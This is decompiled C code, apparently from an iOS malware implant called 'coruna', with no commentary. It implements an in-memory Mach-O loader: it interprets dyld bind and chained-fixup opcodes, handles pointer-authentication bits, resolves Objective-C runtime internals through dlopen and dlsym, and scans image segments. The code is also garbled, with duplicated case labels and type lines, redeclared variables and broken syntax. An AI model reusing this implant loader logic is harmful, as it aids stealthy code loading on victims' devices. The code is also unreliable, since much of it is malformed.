  ptr = coruna_fixup_bind_lazy;
  }
  type_id_8 = coruna_fixup_run_bindings(handle,ptr,0);
  if ((int)type_id_8 != 0) {
  return type_id_8;
  }
  if ((*(ushort *)(handle + 0x1c0) >> 7 & 1) != 0) {
  return 0;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
  ___stack_chk_fail();
  }
  type_id_8 = coruna_fixup_run_exports(handle,ptr,0);
  return type_id_8;
}





uint64_t coruna_fixup_bind_lazy(long handle,long addr_2)
{
  uint64_t u;
  
  if (((handle != 0) && (addr_2 != 0)) && (*(long *)(addr_2 + 8) != 0)) {
    u = coruna_fixup_bind_entry();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_fixup_bind_entry(long handle,uint64_t *val)
{
  int *err;
  int *status;
  char err;
  uint64_t u;
  int *flags;
  int *count;
  uint64_t scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((((handle != 0) && (val != (uint64_t *)0x0)) && (val[1] != 0)) &&
     (u = coruna_readclass_from_image(handle,*(uint32_t *)((long)val + 0x24),val[1],val[3],
                           *(byte *)(val + 2) & 1,&scratch), (int)u == 0)) {
    count = (int *)*val;
    status = *(int **)(handle + 0x40);
    err = (int *)(*(long *)(handle + 0x48) + (long)status);
    if (((((*(ushort *)(handle + 0x1c0) >> 7 & 1) == 0) ||
         (flags = (int *)val[5], flags == (int *)0x0)) ||
        ((*(uint *)(val + 6) == 0 ||
         ((flags + (unsigned long)*(uint *)(val + 6) * 2 < flags || (count < flags)))))) ||
       (flags + (unsigned long)*(uint *)(val + 6) * 2 <= count)) {
      if ((err < status || count < status) || err <= count) {
        return 0x910007;
      }
    }
    else {
      u = coruna_bind_dlopen_table(handle,&scratch);
      if ((int)u != 0) {
        return u;
      }
    }
    err = *(char *)(val + 4);
    if (err == '\x03') {
      u = 0;
      *count = ((int)scratch - (int)count) + -4;
    }
    else if (err == '\x02') {
      u = 0;
      *count = (int)scratch;
    }
    else if (err == '\x01') {
      u = 0;
      *(uint64_t *)count = scratch;
    }
    else {
      u = 0x91000e;
    }
  }
  return u;
}





uint64_t coruna_fixup_run_bindings(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 0x188), handle != 0 && addr_2 != 0)) {
    if (*(int *)(handle + 0x14) == 0) {
      u = 0;
    }
    else {
      scratch = 0;
      u = coruna_block_dispose(handle,*(uint32_t *)(handle + 0x10),&scratch);
      if ((int)u == 0) {
        u = coruna_bzero_4(handle,0,scratch,
                             scratch + (unsigned long)*(uint *)(*(long *)(handle + 0x188) + 0x14),addr_2,
                             val);
      }
    }
  }
  return u;
}





uint64_t coruna_fixup_run_exports(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 0x188), handle != 0 && addr_2 != 0)) {
    if (*(int *)(handle + 0x24) == 0) {
      u = 0;
    }
    else {
      scratch = 0;
      u = coruna_block_dispose(handle,*(uint32_t *)(handle + 0x20),&scratch);
      if ((int)u == 0) {
        u = coruna_bzero_4(handle,1,scratch,
                             scratch + (unsigned long)*(uint *)(*(long *)(handle + 0x188) + 0x24),addr_2,
                             val);
      }
    }
  }
  return u;
}





uint64_t coruna_implant_via_fixup_run_exports(long handle,long addr_2,uint64_t val)
{
  void (*ptr)(void);
  uint64_t u;
  unsigned long unaff_x30;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    if (*(long *)(handle + 0x188) == 0) {
      u = 0;
    }
    else {
      u = coruna_fixup_run_bindings(handle,addr_2);
      if ((int)u == 0) {
        if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
        u = coruna_fixup_run_exports(handle,addr_2,val);
        return u;
      }
    }
  }
  return u;
}





unsigned long coruna_bzero_4(long arg,byte val,byte *n,byte *m,void (*p,
                  uint64_t q)

{
  bool status;
  byte count;
  uint type_id;
  unsigned long version;
  long serial_8;
  uint32_t type_id_15;
  byte *buf;
  byte *entry;
  unsigned long kind;
  unsigned long type_id_12;
  int count;
  unsigned long type_id_8;
  byte idx;
  byte *entry_9;
  void *stack_guard;
  byte *sa_saved;
  uint64_t cache_34;
  unsigned long block_ctx;
  uint64_t cache_36;
  void *region;
  unsigned long plist;
  
  version = 0xad001;
  if ((((arg != 0) && (n != (byte *)0x0)) && (m != (byte *)0x0)) &&
     ((n <= m && (p != (void (*)0x0)))) {
    block_ctx = 0;
    cache_34 = 0;
    region = (void *)0x0;
    sa_saved = (byte *)0x0;
    stack_guard = (void *)0x0;
    cache_36 = 1;
    plist = (unsigned long)val << 0x20;
    if (n < m) {
      idx = 0;
      while( true ) {
        entry_9 = n + 1;
        count = *n;
        if (0xd < count >> 4) break;
        type_id_8 = (unsigned long)count & 0xf;
        count = (int)type_id_8;
        n = entry_9;
        switch(count >> 4) {
        default:
          version = 0;
          idx = val ^ 1 | idx;
          break;
        case 1:
          version = 0;
          cache_36 = coruna_u64_pack((count), ((uint32_t))cache_36);
          break;
        case 2:
          version = 0;
          type_id_8 = 0;
          buf = entry_9;
          do {
            if (m <= buf) {
              type_id_15 = 0;
              n = entry_9;
              break;
            }
            n = buf + 1;
            count = *buf;
            kind = ((unsigned long)count & 0x7f) << (type_id_8 & 0x3f);
            if (0x3f < (uint)type_id_8) {
              kind = 0;
            }
            version = kind | version;
            type_id_15 = (uint32_t)version;
            type_id_8 = (unsigned long)((uint)type_id_8 + 7);
            buf = n;
          } while ((char)count < '\0');
          cache_36 = coruna_u64_pack((type_id_15), ((uint32_t))cache_36);
          version = 0;
          break;
          case 0xb:
          version = (*p)(arg,&stack_guard,q);
          stack_guard = (void *)((long)stack_guard + type_id_8 * 8);
        case 3:
          version = 0;
          if (count == 0) {
            cache_36 = cache_36 & 0xffffffff;
          }
          else {
            cache_36 = coruna_u64_pack(((int)(char)count), ((uint32_t))cache_36) | 0xfffffff000000000;
          }
          break;
        case 4:
          buf = entry_9;
          do {
            if (buf == m) {
              n = entry_9;
              entry_9 = (byte *)0x0;
              break;
            }
            n = buf + 1;
            count = *buf;
            buf = n;
          } while (count != 0);
          cache_34 = coruna_u64_pack71((cache_34), ((char))type_id_8);
          type_id = 0x91000c;
          if (entry_9 != (byte *)0x0) {
            type_id = 0;
          }
          version = (unsigned long)type_id;
          sa_saved = entry_9;
          break;
        case 5:
          version = 0;
          cache_36 = coruna_u64_pack71((cache_36), ((char))type_id_8);
          break;
        case 6:
          block_ctx = 0;
          version = 0;
          buf = entry_9;
          do {
            if (m <= buf) {
              block_ctx = 0;
              n = entry_9;
              goto code_r0x00015340;
            }
            n = buf + 1;
            count = *buf;
            type_id_8 = ((unsigned long)count & 0x7f) << (version & 0x3f);
            if (0x3f < (uint)version) {
              type_id_8 = 0;
            }
            block_ctx = type_id_8 | block_ctx;
            version = (unsigned long)((uint)version + 7);
            buf = n;
          } while ((char)count < '\0');
          if ((count & 0x40) != 0) {
            block_ctx = 0xffffffffffffffff;
          }
code_r0x00015340:
          version = 0;
          break;
        case 7:
          serial_8 = coruna_macho_seg19_offset(arg,type_id_8,0);
          if (serial_8 != 0) {
            version = 0;
            type_id_8 = 0;
            buf = entry_9;
            do {
              if (m <= buf) {
                version = 0;
                n = entry_9;
                break;
              }
              n = buf + 1;
              count = *buf;
              kind = ((unsigned long)count & 0x7f) << (type_id_8 & 0x3f);
              if (0x3f < (uint)type_id_8) {
                kind = 0;
              }
              version = kind | version;
              type_id_8 = (unsigned long)((uint)type_id_8 + 7);
              buf = n;
            } while ((char)count < '\0');
            stack_guard = (void *)(version + serial_8);
            version = 0;
            break;
            case 0xb:
            version = (*p)(arg,&stack_guard,q);
            stack_guard = (void *)((long)stack_guard + type_id_8 * 8);
          }
          version = 0x910009;
          goto load_ok_28;
        case 8:
          version = 0;
          type_id_8 = 0;
          buf = entry_9;
          do {
            if (m <= buf) {
              version = 0;
              n = entry_9;
              break;
            }
            n = buf + 1;
            count = *buf;
            kind = ((unsigned long)count & 0x7f) << (type_id_8 & 0x3f);
            if (0x3f < (uint)type_id_8) {
              kind = 0;
            }
            version = kind | version;
            type_id_8 = (unsigned long)((uint)type_id_8 + 7);
            buf = n;
          } while ((char)count < '\0');
          stack_guard = (void *)((long)stack_guard + version);
          version = 0;
          break;
          case 0xb:
          version = (*p)(arg,&stack_guard,q);
          stack_guard = (void *)((long)stack_guard + type_id_8 * 8);
        case 9:
          version = (*p)(arg,&stack_guard,q);
          goto code_r0x00015280;
        case 10:
          version = (*p)(arg,&stack_guard,q);
          if ((int)version != 0) goto load_ok_28;
          version = 0;
          type_id_8 = 0;
          buf = entry_9;
          do {
            if (m <= buf) {
              version = 0;
              n = entry_9;
              break;
            }
            n = buf + 1;
            count = *buf;
            kind = ((unsigned long)count & 0x7f) << (type_id_8 & 0x3f);
            if (0x3f < (uint)type_id_8) {
              kind = 0;
            }
            version = kind | version;
            type_id_8 = (unsigned long)((uint)type_id_8 + 7);
            buf = n;
          } while ((char)count < '\0');
          stack_guard = (void *)((long)stack_guard + version + 8);
code_r0x00015434:
          version = 0;
          break;
        case 0xb:
          version = (*p)(arg,&stack_guard,q);
          stack_guard = (void *)((long)stack_guard + type_id_8 * 8);
code_r0x00015280:
          stack_guard = (void *)((long)stack_guard + 8);
          break;
        case 0xc:
          type_id_8 = 0;
          version = 0;
          buf = entry_9;
          do {
            if (m <= buf) {
              type_id_8 = 0;
              entry = entry_9;
              break;
            }
            entry = buf + 1;
            count = *buf;
            kind = ((unsigned long)count & 0x7f) << (version & 0x3f);
            if (0x3f < (uint)version) {
              kind = 0;
            }
            type_id_8 = kind | type_id_8;
            version = (unsigned long)((uint)version + 7);
            buf = entry;
          } while ((char)count < '\0');
          kind = 0;
          version = 0;
          entry_9 = entry;
          do {
            if (m <= entry_9) {
              kind = 0;
              n = entry;
              break;
            }
            n = entry_9 + 1;
            count = *entry_9;
            type_id_12 = ((unsigned long)count & 0x7f) << (version & 0x3f);
            if (0x3f < (uint)version) {
              type_id_12 = 0;
            }
            kind = type_id_12 | kind;
            version = (unsigned long)((uint)version + 7);
            entry_9 = n;
          } while ((char)count < '\0');
          if (0xfffffffe < type_id_8) {
code_r0x000154f8:
            version = 0x91000f;
            goto load_ok_28;
          }
          if (type_id_8 == 0) {
            version = 0;
          }
          else {
            type_id_12 = 1;
            do {
              version = (*p)(arg,&stack_guard,q);
              stack_guard = (void *)(kind + 8 + (long)stack_guard);
              if ((int)version != 0) break;
              status = type_id_12 < type_id_8;
              type_id_12 = (unsigned long)((int)type_id_12 + 1);
            } while (status);
          }
          break;
        case 0xd:
          if (count == 1) {
            version = coruna_return_zero_15594(arg,region,plist & 0xffff,stack_guard,0,8,0);
          }
          else {
            version = 0x91000d;
            version = 0;
            buf = entry_9;
            do {
              if (m <= buf) {
                version = 0;
                n = entry_9;
                break;
              }
              n = buf + 1;
              count = *buf;
              kind = ((unsigned long)count & 0x7f) << (type_id_8 & 0x3f);
              if (0x3f < (uint)type_id_8) {
                kind = 0;
              }
              version = kind | version;
              type_id_8 = (unsigned long)((uint)type_id_8 + 7);
              buf = n;
            } while ((char)count < '\0');
            if (region != (void *)0x0) {
              _bzero(region,(plist & 0xffffffff) << 3);
              _free(region);
              region = (void *)0x0;
              plist = plist & 0xffffffff00000000;
            }
            if (version >> 0x10 != 0) goto code_r0x000154f8;
            plist = coruna_u64_pack((plist), (int)version);
            if ((int)version != 0) {
              stack_guard = _calloc(version,8);
              if (stack_guard == (void *)0x0) {
                return 0xad009;
              }
              version = 0;
              region = stack_guard;
            }
          }
        }
        if ((((int)version != 0) || ((idx & 1) != 0)) || (m <= n)) goto load_ok_28;
      }
load_ok_29:
      version = 0x91000d;
load_ok_28:
      if (region != (void *)0x0) {
        _bzero(region,(plist & 0xffffffff) << 3);
        _free(region);
      }
    }
    else {
      version = 0;
    }
  }
  return version;
}





uint64_t
uint64_t coruna_return_zero_15594(int64_t arg,int64_t arg,uint64_t val,uint64_t *id_2,int flags,uint size, int count_2)
{
  long handle;
  unsigned long *ptr;
  long addr;
  unsigned long u;
  unsigned long *buf;
  unsigned long size;
  int err;
  uint64_t version;
  unsigned long port;
  uint64_t *str;
  unsigned long tag;
  unsigned long kind;
  unsigned long scratch;
  unsigned long bootargs;
  
  version = 0xad001;
  if (((arg != 0) && (id_2 != (unsigned long *)0x0)) && ((size & 3) == 0)) {
    u = 0xffffff;
    if (count_2 == 0) {
      u = 0xffff;
    }
    while( true ) {
      bootargs = 0;
      buf = *(unsigned long **)(arg + 8);
      ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
      if (((((ptr < buf || id_2 < buf) || ptr <= id_2) ||
           (unsigned long *)0xfffffffffffffff7 < id_2) || id_2 + 1 < buf) || ptr < id_2 + 1)
      break;
      scratch = *id_2;
      if ((long)scratch < 0) {
        if ((scratch >> 0x3e & 1) == 0) {
          err = coruna_block_dispose(arg,&scratch,id_2);
          tag = scratch;
          if (err == 0) {
            tag = *(unsigned long *)(arg + 0x40);
            kind = scratch & 0xffffffff;
            port = kind + tag;
            kind = kind + tag;
            }
            bootargs = kind;
            if ((*(int *)(arg + 0x5c) == 0x100000c) && (*(int *)(arg + 0x60) < 2)) {
            bootargs = port;
            }
            *id_2 = bootargs;
            if ((scratch >> 0x33 & 0x7ff) == 0) {
            return 0;
          }
          addr = (long)id_2 + (*(long *)(arg + 0x40) - *(long *)(arg + 8));
          handle = *(long *)(arg + 0x40) + (scratch & 0xffffffff);
          port = coruna_pac_sig_ext(scratch,addr,handle);
          kind = port;
          if (*(char *)(arg + 0x138) != '\0') {
            bootargs = port;
            str = _calloc(1,0x20);
            if (str == (uint64_t *)0x0) {
              return 0xad009;
            }
            *str = *(uint64_t *)(arg + 0x140);
            str[1] = addr;
            str[2] = tag;
            str[3] = handle;
done:
            *(uint64_t **)(arg + 0x140) = str;
            kind = bootargs;
          }
        }
        else {
          if ((val & 0xffffffff) <= (scratch & u)) {
            return 0x920001;
          }
          tag = *(unsigned long *)(arg + (scratch & u) * 8);
          if (tag == 0) {
            port = 0;
            kind = bootargs;
          }
          else {
            err = coruna_block_dispose(arg,&scratch,id_2);
            size = scratch;
            port = tag;
            kind = tag;
            if (err != 0) {
              handle = (long)id_2 + (*(long *)(arg + 0x40) - *(long *)(arg + 8));
              port = coruna_pac_sig_ext(scratch,handle,tag);
              kind = port;
              if (*(char *)(arg + 0x138) != '\0') {
                bootargs = port;
                str = _calloc(1,0x20);
                if (str == (uint64_t *)0x0) {
                  return 0xad009;
                }
                *str = *(uint64_t *)(arg + 0x140);
                str[1] = handle;
                str[2] = size;
                str[3] = tag;
                *(uint64_t **)(arg + 0x140) = str;
                kind = bootargs;
                }
                }
                else {
                if ((val & 0xffffffff) <= (scratch & u)) {
                return 0x920001;
              }
            }
          }
        }
      }
      else {
        if ((scratch >> 0x3e & 1) == 0) {
          tag = scratch & 0x7ffffffffff | (scratch >> 0x2b) << 0x38;
          if (flags == 0) {
            kind = *(unsigned long *)(arg + 0x50);
          }
          else {
            kind = *(unsigned long *)(arg + 0x40);
          }
        }
        else {
          if ((val & 0xffffffff) <= (scratch & u)) {
            return 0x920001;
          }
          tag = scratch >> 0x20 & 0x7ffff;
          if ((scratch & 0x4000000000000) != 0) {
            tag = scratch >> 0x20 | 0xfffffffffffc0000;
          }
          kind = *(unsigned long *)(arg + (scratch & u) * 8);
        }
fail:
        port = kind + tag;
        kind = kind + tag;
      }
      bootargs = kind;
      if ((*(int *)(arg + 0x5c) == 0x100000c) && (*(int *)(arg + 0x60) < 2)) {
        bootargs = port;
      }
      *id_2 = bootargs;
      if ((scratch >> 0x33 & 0x7ff) == 0) {
        return 0;
      }
      id_2 = (unsigned long *)((long)id_2 + (unsigned long)(((uint)(scratch >> 0x33) & 0x7ff) * size));
    }
    version = 0x920006;
  }
  return version;
}





uint64_t coruna_block_dispose(long handle,unsigned long *arg,long addr_2)
{
  char err;
  uint64_t u;
  unsigned long size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  long action;
  long block_ctx;
  uint64_t stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint8_t path_buf;
  
  u = 0;
  if (((handle != 0) && (arg != (unsigned long *)0x0)) && (addr_2 != 0)) {
    if (((*(double *)k_implant_dyldversionnumber_slot < 800.0) && (size = *arg, (long)size < 0)
        ) && (((size & 0x6000000000000) == 0x4000000000000 && ((size & 0xffff00000000) != 0)))) {
      serial_buf = &stack_guard;
      stack_guard = 0;
      sa_new = k_implant_rodata_word_26a68;
      path_buf = 0;
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_26a70;
      thread_attr = coruna_check_objc_section;
      host_info = &k_implant_rodata_word_28630;
      action = addr_2;
      block_ctx = handle;
      sa_saved = serial_buf;
      coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
      err = *(char *)(sa_saved + 3);
      __Block_object_dispose(&stack_guard,8);
      if (err != '\0') {
        return 0;
      }
    }
    u = 1;
  }
  return u;
}



coruna_svc_regpack_t coruna_pac_sig_ext(unsigned long arg,unsigned long val,uint64_t n)

{
  uint8_t tag[16];
  
  if ((long)arg < 0) {
    val = val & 0xffffffffffff | (arg >> 0x20) << 0x30;
    switch(arg >> 0x31 & 3) {
    default:
      break;
    case 1:
      break;
    case 2:
      break;
    case 3:
    }
  }
  tag = val;
  tag = n;
  return tag;
}





uint64_t coruna_check_objc_section(long handle,long addr_2)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  int err;
  char *ptr;
  uint64_t tag;
  char *buf;
  long handle;
  long addr;
  
  port = *(unsigned long *)(handle + 0x28);
  addr = *(long *)(*(long *)(handle + 0x30) + 0x18);
  size = addr + *(long *)(addr_2 + 0x18);
  u = port + 1;
  version = size + *(long *)(addr_2 + 0x20);
  if ((((((version >= size && port >= size) && port <= version) &&
        ((version < size || port < size) || version != port)) && port != 0xffffffffffffffff) &&
      size <= u) && u <= version) {
    tag = 0xad017;
    err = _strncmp((char *)(addr_2 + 8),"__DATA",6);
    if (err == 0) {
      buf = (char *)(addr_2 + 0x48);
      ptr = buf + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
      handle = *(long *)(*(long *)(handle + 0x20) + 8);
      if (*(char *)(handle + 0x18) == '\0' && buf < ptr) {
        do {
          size = *(long *)(buf + 0x20) + addr;
          version = size + *(long *)(buf + 0x28);
          if (((((version >= size && port >= size) && port <= version) &&
               ((version < size || port < size) || version != port)) && size <= u) &&
              u <= version) {
            err = _strncmp(buf,"__cfstring",0xc);
            if ((err != 0) && (err = _strncmp(buf,"__objc",6), err != 0)) {
              return 0xad017;
            }
            *(uint8_t *)(handle + 0x18) = 1;
            return 0xad017;
          }
          buf = buf + 0x50;
        } while (buf < ptr);
      }
    }
  }
  else {
    tag = 0;
  }
  return tag;
}





void coruna_block_assign(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  return;
}





void coruna_block_dispose_byref(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint64_t
uint64_t coruna_bind_interpret(int64_t arg,int64_t arg,uint64_t val,int64_t val,int flags,uint64_t id_2)
{
  unsigned long *ptr;
  unsigned long *buf;
  ushort u;
  uint size;
  bool err;
  uint64_t version;
  uint32_t port;
  uint64_t tag;
  uint kind;
  unsigned long type_id;
  unsigned long type_id_8;
  long handle;
  unsigned long *scratch [2];
  
  version = 0xad001;
  if ((arg != 0) && (arg != 0)) {
    scratch[0] = (unsigned long *)0x0;
    version = coruna_block_dispose(arg,*(long *)(arg + 8) + (id_2 & 0xffffffff) +
                                 (unsigned long)((uint)*(ushort *)(arg + 4) * flags),scratch);
    if ((int)version == 0) {
      tag = 0x920006;
      u = *(ushort *)(arg + 6);
      version = 0x920005;
      if (u < 0xd) {
        kind = (uint)u;
        size = 1 << (unsigned long)(kind & 0x1f);
        if ((size & 0x1282) == 0) {
          if (((size & 0x44) != 0) && (version = 0xad001, scratch[0] != (unsigned long *)0x0)) {
            buf = *(unsigned long **)(arg + 8);
            ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
            version = tag;
            if (((buf <= ptr) &&
                (((buf <= scratch[0] && (scratch[0] < ptr)) &&
                 (scratch[0] < (unsigned long *)0xfffffffffffffff8)))) &&
               ((buf <= scratch[0] + 1 && (scratch[0] + 1 <= ptr)))) {
              do {
                type_id = *scratch[0];
                if ((long)type_id < 0) {
                  if ((uint)val <= (uint)(type_id & 0xffffff)) {
                    return 0x920001;
                  }
                  type_id_8 = *(long *)(val + (type_id & 0xffffff) * 8) + (type_id >> 0x18 & 0xff);
                }
                else {
                  if (kind == 2) {
                    handle = *(long *)(arg + 0x50);
                  }
                  else {
                    handle = *(long *)(arg + 0x40);
                  }
                  type_id_8 = handle + (type_id & 0xfffffffff | (type_id >> 0x24) << 0x38);
                }
                *scratch[0] = type_id_8;
                if ((type_id >> 0x33 & 0xfff) == 0) {
                  return 0;
                }
                buf = *(unsigned long **)(arg + 8);
                ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
                if (ptr < buf) {
                  return 0x920006;
                }
                scratch[0] = (unsigned long *)((long)scratch[0] +
                                       (unsigned long)(((uint)(type_id >> 0x33) & 0xfff) << 2));
                err = scratch[0] < buf;
              } while (((((!err && scratch[0] <= ptr) && (err || ptr != scratch[0])) &&
                         scratch[0] < (unsigned long *)0xfffffffffffffff7 ||
                        ((!err && scratch[0] <= ptr) && (err || ptr != scratch[0])) &&
                        scratch[0] == (unsigned long *)0xfffffffffffffff7) && buf <= scratch[0] + 1) &&
                       scratch[0] + 1 <= ptr);
            }
          }
        }
        else {
          port = 4;
          if (u != 7) {
            port = 8;
          }
          version = coruna_return_zero_15594(arg,val,val,scratch[0],kind != 1,port,kind == 0xc);
        }
      }
    }
  }
  return version;
}





uint64_t coruna_objc_resolve_method(long handle,long addr_2,int flags)
{
  uint64_t u;
  long handle;
  uint64_t size;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  
  u = 0xad001;
  if ((((handle != 0) && (handle = *(long *)(handle + 0x38), handle != 0)) &&
      (*(long *)(handle + 0x40) != 0)) && ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) {
    if ((flags == 0x3c) || (flags == 0x28)) {
      size = *(uint64_t *)(addr_2 + 8);
      bootargs = 0;
      scratch = 0;
      scratch = size;
      if (((*(int *)(handle + 0x50) != 2) || (flags != 0x28)) ||
         (u = coruna_implant08_via_identity(handle,handle,handle + 0x58), (int)u == 0)) {
        if (flags == 0x28) {
          (**(void (**)(handle + 0x40))(1,&bootargs,&scratch);
          if (*(int *)(handle + 0x50) == 1) {
            coruna_find_data_dirty(handle);
          }
        }
        else {
          (**(void (**)(handle + 0x48))(0,size);
        }
        u = 0;
      }
    }
    else {
      u = 0x1800b;
    }
  }
  return u;
}





uint32_t coruna_find_data_dirty(long handle)
{
  int err;
  byte err;
  int status;
  uint32_t u;
  long handle;
  long addr;
  int *err;
  unsigned long size;
  int flags;
  int *status;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    err = *(int *)(handle + 0x10);
    u = 0x18006;
    if (err != 0) {
      err = 0;
      flags = 0;
      handle = 0;
      addr = 0;
      status = (int *)(handle + 0x20);
      do {
        if (*status == 0x19) {
          status = _strcmp((char *)(status + 2),"__TEXT");
          if (status == 0) {
            handle = handle - *(long *)(status + 6);
            err = 1;
          }
          else {
            status = _strcmp((char *)(status + 2),"__DATA_DIRTY");
            if ((status == 0) && (size = (unsigned long)(uint)status[0x10], status[0x10] != 0)) {
              err = status + 0x12;
              do {
                status = _strcmp((char *)err,"__common");
                if (status == 0) {
                  addr = handle + *(long *)(err + 8);
                }
                err = err + 0x14;
                size = size - 1;
              } while (size != 0);
            }
          }
        }
        status = (int *)((long)status + (unsigned long)(uint)status[1]);
        flags = flags + 1;
      } while (flags != err);
      u = 0x1800c;
      if (!(bool)(err & addr != 0)) {
        u = 0x18006;
      }
    }
  }
  return u;
}
uint64_t coruna_objc_flush_caches(long handle)
{
  bool err;
  unsigned long u;
  unsigned long size;
  uint32_t version;
  char *ptr;
  uint port;
  unsigned long tag;
  unsigned long kind;
  bool status;
  bool flags;
  bool count;
  bool idx;
  bool i;
  int err;
  long handle;
  long addr;
  unsigned long type_id;
  unsigned long type_id_8;
  uint64_t type_id_9;
  uint type_id_10;
  uint32_t type_id_11;
  int *err;
  unsigned long *ptr;
  long off;
  unsigned long type_id_12;
  unsigned long *buf;
  unsigned long type_id_13;
  uint64_t type_id_14;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info [6];
  unsigned long *serial_buf;
  
  if (handle == 0) {
    return 0xad001;
  }
  type_id_14 = 0x18008;
  handle = _dlopen("/usr/lib/libobjc.A.dylib",2);
  if (handle == 0) {
    return 0x18004;
  }
  host_info[2] = 0;
  host_info[1] = 0;
  host_info[4] = 0;
  host_info[3] = 0;
  addr = _dlsym(handle,"object_getClass");
  type_id = _dlsym(handle,"_objc_patch_root_of_class");
  type_id_8 = _dlsym(handle,"_objc_map_images");
  if (addr == 0) {
    type_id_9 = 0x18002;
  }
  else {
    err = _dladdr(addr,host_info + 1);
    kind = host_info[2];
    type_id_9 = 0x18003;
    if ((err != 0) && (host_info[2] != 0)) {
      thread_attr = 0;
      host_info[0] = 0;
      type_id_9 = coruna_macho_text_seg("__TEXT","__text",host_info[2],host_info,&thread_attr);
      tag = host_info[0];
      addr = thread_attr;
      if ((int)type_id_9 == 0) {
        err = *(int *)(kind + 0x10);
        if (err != 0) {
          err = (int *)(kind + 0x20);
          do {
            if (*err == 0x25) {
              off = 8;
              port = *(uint *)((long)err + off);
              scratch = 0;
              bootargs = 0;
              count = host_info[0] == 0;
              idx = thread_attr == 0;
              type_id_13 = bootargs;
              bootargs = type_id_13;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((count || idx) ||
              (type_id_9 = coruna_implant_via_ctx_free_2(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
            }
            if (*err == 0x32) {
              off = 0xc;
              port = *(uint *)((long)err + off);
              scratch = 0;
              bootargs = 0;
              count = host_info[0] == 0;
              idx = thread_attr == 0;
              type_id_13 = bootargs;
              bootargs = type_id_13;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((count || idx) ||
              (type_id_9 = coruna_implant_via_ctx_free_2(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
            }
            err = (int *)((long)err + (unsigned long)(uint)err[1]);
            err = err + -1;
          } while (err != 0);
        }
        type_id_9 = 0x18009;
      }
    }
  }
  _dlclose(handle);
  return type_id_9;
}
